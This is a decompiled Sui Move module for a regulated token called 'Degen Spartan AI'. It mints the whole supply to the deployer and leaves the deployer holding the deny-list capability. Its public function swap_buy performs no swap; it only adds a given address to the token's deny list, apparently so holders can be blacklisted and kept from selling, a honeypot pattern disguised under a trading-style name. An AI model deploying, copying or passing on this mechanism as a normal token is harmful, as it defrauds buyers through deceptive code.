module 0xd0b71757104050204d8b8f87316d815d568089b438189cd5608070774a13b04::degenai {
    struct DEGENAI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: DEGENAI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DEGENAI>(arg0, 9, b"degenai", b"Degen Spartan AI", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmR2DdZaMF56TcHRprpzaJdDuFpDTgz7qLs9tX1JrViXU4"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DEGENAI>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DEGENAI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DEGENAI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DEGENAI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DEGENAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DEGENAI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

